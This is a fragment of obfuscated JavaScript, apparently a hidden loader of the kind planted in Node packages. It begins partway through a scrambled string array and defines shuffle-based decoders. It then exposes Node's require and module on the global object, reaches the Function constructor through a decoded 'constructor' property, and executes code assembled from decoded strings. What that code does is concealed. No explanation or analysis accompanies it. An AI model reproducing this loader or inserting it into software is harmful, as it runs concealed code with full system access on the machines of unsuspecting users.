*R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR"];function b(q,h){for(var i,p,t,s,j,m,g=[],o=0,k=h[0];o< q.length;){g[o]= q.charAt(o),o+= 1};for(i= g.length,o= 0;o< i;){p= k* (o+ h[1])+ k% h[2],j= (t= k* (o+ h[3])+ k% h[4])% i,m= g[s= p% i],g[s]= g[j],g[j]= m,k= (p+ t)% h[5],o+= 1};return g.join(a[0x0])}function c(q){var h=String.fromCharCode(28),i=b(q,NX);return (i= (i= (i= i.split(a[0x3]).join(h)).split(a[0x4]).join(a[0x3])).split(a[0x2]).join(a[0x1])).split(h)}function d(q){return b(q,SX)}function f(v,m){try{var u=Object.getOwnPropertyDescriptor(v,"name");if(!u|| (!u.writable&&  !u.enumerable && u.configurable &&  typeof u.value== "string")){Object.defineProperty(v,"name",{value:m,configurable:true})}}catch(e){};return v}spin= f(b,"spin");splitLane= f(c,"splitLane");peel= f(d,"peel");NX= [6912847,367,20411,613,43759,5019283],SX= [5283741,241,41953,187,56129,4738901];!function(q,h){q.z= z;var i=c(a[0x5]);q[i[0]]= h, typeof module=== i[1]&& (q[i[2]]= module);var p=d(a[0x6]),t=d[p.substring(0,11)],s=t(a[0x0],d(a[0x7]));t(a[0x0],s(d(a[0x8])))(2509)}(global,require)})()
